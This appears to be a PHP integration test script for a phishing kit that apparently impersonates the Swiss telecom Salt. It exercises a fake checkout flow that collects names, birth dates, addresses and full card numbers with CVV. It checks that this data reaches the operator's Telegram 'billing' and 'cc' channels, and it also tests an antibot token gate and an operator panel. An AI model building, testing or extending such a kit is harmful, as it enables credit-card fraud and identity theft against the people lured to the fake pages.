<?php

declare(strict_types=1);

/**
 * Tests d'intégration réels — lancer avec le serveur PHP :
 *   php -S 127.0.0.1:8765 -t "scm salt" "scm salt/index.php"
 *   php "scm salt/tests/integration-test.php"
 */

$base = getenv('SALT_TEST_BASE') ?: 'http://127.0.0.1:8765';
$root = dirname(__DIR__);

$results = [];
$cookieJar = tempnam(sys_get_temp_dir(), 'salt_cookie_');

function test(string $name, callable $fn): void
{
    global $results;
    try {
        $detail = $fn();
        $results[] = ['name' => $name, 'ok' => true, 'detail' => $detail];
        echo "✅ {$name}" . ($detail ? " — {$detail}" : '') . PHP_EOL;
    } catch (Throwable $e) {
        $results[] = ['name' => $name, 'ok' => false, 'detail' => $e->getMessage()];
        echo "❌ {$name} — {$e->getMessage()}" . PHP_EOL;
    }
}

function assert_true(bool $cond, string $msg): void
{
    if (!$cond) {
        throw new RuntimeException($msg);
    }
}

function http_request(string $method, string $url, ?array $body = null, array $headers = [], ?string $cookieJar = null): array
{
    $ch = curl_init($url);
    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HEADER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ];

    if ($cookieJar !== null) {
        $opts[CURLOPT_COOKIEJAR] = $cookieJar;
        $opts[CURLOPT_COOKIEFILE] = $cookieJar;
    }

    $hdrs = $headers;
    if ($body !== null) {
        $json = json_encode($body, JSON_UNESCAPED_UNICODE);
        $hdrs[] = 'Content-Type: application/json';
        $opts[CURLOPT_POSTFIELDS] = $json;
    }

    if ($hdrs !== []) {
        $opts[CURLOPT_HTTPHEADER] = $hdrs;
    }

    curl_setopt_array($ch, $opts);
    $raw = curl_exec($ch);
    if ($raw === false) {
        throw new RuntimeException('cURL: ' . curl_error($ch));
    }

    $status = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $headerSize = (int) curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);

    if ($status >= 300 && $status < 400 && preg_match('/^Location:\s*(\S+)/mi', substr($raw, 0, $headerSize), $loc)) {
        $location = trim($loc[1]);
        if (str_starts_with($location, '/') || str_contains($location, parse_url($url, PHP_URL_HOST) ?: '')) {
            $next = str_starts_with($location, 'http') ? $location : (parse_url($url, PHP_URL_SCHEME) . '://' . parse_url($url, PHP_URL_HOST) . $location);
            return http_request($method, $next, $body, $headers, $cookieJar);
        }
        throw new RuntimeException("Redirect externe bloquée: {$location}");
    }

    return [
        'status' => $status,
        'headers' => substr($raw, 0, $headerSize),
        'body' => substr($raw, $headerSize),
    ];
}

function extract_antibot_token(string $html): string
{
    if (preg_match('/window\.SALT_ANTIBOT\s*=\s*(\{[^}]+\})/', $html, $m)) {
        $json = json_decode($m[1], true);
        if (is_array($json) && !empty($json['token'])) {
            return (string) $json['token'];
        }
    }

    throw new RuntimeException('Token antibot introuvable dans la page');
}

echo "=== Tests Salt — base: {$base} ===" . PHP_EOL . PHP_EOL;

// --- Config / fichiers ---
test('config/telegram.php existe', function () use ($root) {
    $path = $root . '/config/telegram.php';
    if (!is_file($path)) {
        return 'MANQUANT — les envois Telegram échoueront';
    }
    $cfg = require $path;
    assert_true(is_array($cfg), 'config invalide');
    $token = trim((string) ($cfg['bot_token'] ?? ''));
    $billing = trim((string) ($cfg['chat_id_billing'] ?? ''));
    $cc = trim((string) ($cfg['chat_id_cc'] ?? ''));
    $issues = [];
    if ($token === '') {
        $issues[] = 'bot_token vide';
    }
    if ($billing === '') {
        $issues[] = 'chat_id_billing vide';
    }
    if ($cc === '') {
        $issues[] = 'chat_id_cc vide';
    }
    if (empty($cfg['enabled'])) {
        $issues[] = 'enabled=false';
    }

    return $issues === [] ? 'OK (token + billing + cc renseignés)' : implode(', ', $issues);
});

test('Syntaxe PHP (lint)', function () use ($root) {
    $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root));
    $errors = [];
    foreach ($iter as $file) {
        if (!$file->isFile() || $file->getExtension() !== 'php') {
            continue;
        }
        $path = $file->getPathname();
        if (str_contains($path, '/tests/')) {
            continue;
        }
        exec('php -l ' . escapeshellarg($path) . ' 2>&1', $out, $code);
        if ($code !== 0) {
            $errors[] = basename($path) . ': ' . implode(' ', $out);
        }
    }
    assert_true($errors === [], implode('; ', $errors));

    return count(iterator_to_array($iter)) . ' fichiers OK';
});

test('Routage canaux Telegram (unitaire)', function () use ($root) {
    require_once $root . '/app/services/telegram.php';
    $cfg = [
        'chat_id_clicks' => '-111',
        'chat_id_billing' => '-222',
        'chat_id_cc' => '-333',
    ];
    assert_true(telegram_chat_id($cfg, 'billing') === '-222', 'billing incorrect');
    assert_true(telegram_chat_id($cfg, 'cc') === '-333', 'cc incorrect');
    assert_true(telegram_chat_id($cfg, 'clicks') === '-111', 'clicks incorrect');
    assert_true(telegram_chat_id($cfg, 'rez') === '', 'rez doit être vide');

    return 'billing/cc/clicks OK, rez supprimé';
});

test('BIN lookup binlist.net (réseau)', function () {
    $ch = curl_init('https://lookup.binlist.net/411111');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_HTTPHEADER => ['Accept: application/json', 'Accept-Version: 3'],
    ]);
    $body = curl_exec($ch);
    $status = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    assert_true($status === 200, "HTTP {$status}");
    $json = json_decode((string) $body, true);
    assert_true(is_array($json) && !empty($json['scheme']), 'réponse BIN invalide');

    return 'scheme=' . ($json['scheme'] ?? '?') . ', bank=' . ($json['bank']['name'] ?? '?');
});

// --- HTTP / flux checkout ---
test('Page connexion charge (HTTP 200)', function () use ($base, $cookieJar) {
    $res = http_request('GET', $base . '/pages/connexion.php', null, [], $cookieJar);
    assert_true($res['status'] === 200, 'HTTP ' . $res['status']);
    assert_true(str_contains($res['body'], 'SALT_ANTIBOT'), 'script antibot absent');

    return 'HTTP 200';
});

$token = null;

test('Token antibot extrait', function () use ($base, $cookieJar, &$token) {
    $res = http_request('GET', $base . '/pages/informations.php', null, [], $cookieJar);
    assert_true($res['status'] === 200, 'HTTP ' . $res['status']);
    $token = extract_antibot_token($res['body']);

    return 'token=' . substr($token, 0, 8) . '...';
});

test('antibot-verify.php', function () use ($base, $cookieJar, &$token) {
    assert_true($token !== null, 'pas de token');
    $res = http_request('POST', $base . '/api/antibot-verify.php', [], ['X-Salt-Token: ' . $token], $cookieJar);
    assert_true($res['status'] === 200, 'HTTP ' . $res['status']);
    $json = json_decode($res['body'], true);
    assert_true(is_array($json) && !empty($json['ok']), $res['body']);

    return 'vérifié';
});

test('checkout-sync.php', function () use ($base, $cookieJar, &$token) {
    $payload = [
        'email' => 'test@example.com',
        'firstName' => 'Jean',
        'lastName' => 'Dupont',
        'phone' => '+41791234567',
        'birthDate' => '15/03/1985',
        'country' => 'ch',
        'zip' => '1204',
        'city' => 'Genève',
        'street' => 'Rue du Rhône',
        'streetNumber' => '12',
    ];
    $res = http_request('POST', $base . '/api/checkout-sync.php', $payload, ['X-Salt-Token: ' . $token], $cookieJar);
    assert_true($res['status'] === 200, 'HTTP ' . $res['status'] . ' — ' . $res['body']);
    $json = json_decode($res['body'], true);
    assert_true(is_array($json) && !empty($json['ok']), $res['body']);

    return 'données sync OK';
});

test('partial-notify.php (billing)', function () use ($base, $cookieJar, &$token) {
    $payload = [
        'email' => 'test@example.com',
        'firstName' => 'Jean',
        'lastName' => 'Dupont',
        'phone' => '+41791234567',
        'birthDate' => '15/03/1985',
        'country' => 'ch',
        'zip' => '1204',
        'city' => 'Genève',
        'street' => 'Rue du Rhône',
        'streetNumber' => '12',
    ];
    $res = http_request('POST', $base . '/api/partial-notify.php', $payload, ['X-Salt-Token: ' . $token], $cookieJar);
    assert_true($res['status'] === 200, 'HTTP ' . $res['status'] . ' — ' . $res['body']);
    $json = json_decode($res['body'], true);
    assert_true(is_array($json), $res['body']);

    if (empty($json['sent'])) {
        return 'sent=false (config Telegram manquante ou API refusée)';
    }

    return 'sent=true — message billing envoyé';
});

test('partial-notify.php idempotent (2e appel)', function () use ($base, $cookieJar, &$token) {
    $res = http_request('POST', $base . '/api/partial-notify.php', ['firstName' => 'Jean', 'lastName' => 'Dupont'], ['X-Salt-Token: ' . $token], $cookieJar);
    $json = json_decode($res['body'], true);
    assert_true(is_array($json), $res['body']);

    if (empty($json['sent'])) {
        return 'sent=false (normal si déjà notified)';
    }

    return 'ATTENTION: 2e envoi billing — doublon possible';
});

test('notify.php sans token → 403 (antibot actif) ou 200 (antibot off)', function () use ($base, $root) {
    $antibotCfg = is_file($root . '/config/antibot.php') ? require $root . '/config/antibot.php' : [];
    $res = http_request('POST', $base . '/api/notify.php', ['cardNumber' => '4111111111111111', '_hp' => '']);

    if (!empty($antibotCfg['enabled'])) {
        assert_true($res['status'] === 403, 'HTTP ' . $res['status']);
        return 'antibot actif — 403 OK';
    }

    assert_true($res['status'] === 200, 'HTTP ' . $res['status']);
    return 'antibot désactivé — pas de 403 (normal en test local)';
});

test('notify.php (CC)', function () use ($base, $cookieJar, &$token) {
    $payload = [
        'email' => 'test@example.com',
        'firstName' => 'Jean',
        'lastName' => 'Dupont',
        'cardHolder' => 'JEAN DUPONT',
        'cardNumber' => '4111111111111111',
        'cardExpiry' => '12/28',
        'cardCvv' => '123',
        '_hp' => '',
        'client' => ['userAgent' => 'Test', 'device' => 'Desktop', 'os' => 'Linux'],
    ];
    $res = http_request('POST', $base . '/api/notify.php', $payload, ['X-Salt-Token: ' . $token], $cookieJar);

    assert_true($res['status'] === 200, 'HTTP ' . $res['status'] . ' — ' . $res['body']);
    $json = json_decode($res['body'], true);
    assert_true(is_array($json), $res['body']);

    if (empty($json['ok'])) {
        return 'ok=false (config Telegram manquante)';
    }

    return 'ok=true — message CC envoyé';
});

test('checkout-complete.php', function () use ($base, $cookieJar, &$token) {
    $res = http_request('POST', $base . '/api/checkout-complete.php', [], ['X-Salt-Token: ' . $token], $cookieJar);
    assert_true($res['status'] === 200, 'HTTP ' . $res['status']);

    return 'OK';
});

test('Pages paiement + récapitulatif', function () use ($base, $cookieJar) {
    foreach (['paiement.php', 'recapitulatif.php'] as $page) {
        $res = http_request('GET', $base . '/pages/' . $page, null, [], $cookieJar);
        assert_true($res['status'] === 200, "{$page} HTTP " . $res['status']);
    }

    return 'HTTP 200';
});

test('Panel login page', function () use ($base) {
    $res = http_request('GET', $base . '/panel/index.php');
    assert_true($res['status'] === 200, 'HTTP ' . $res['status']);

    return 'OK';
});

@unlink($cookieJar);

echo PHP_EOL . '=== Résumé ===' . PHP_EOL;
$ok = count(array_filter($results, static fn ($r) => $r['ok']));
$fail = count($results) - $ok;
echo "Passés: {$ok}/" . count($results) . " | Échecs: {$fail}" . PHP_EOL;

if ($fail > 0) {
    echo PHP_EOL . 'Échecs:' . PHP_EOL;
    foreach ($results as $r) {
        if (!$r['ok']) {
            echo "  - {$r['name']}: {$r['detail']}" . PHP_EOL;
        }
    }
    exit(1);
}

exit(0);
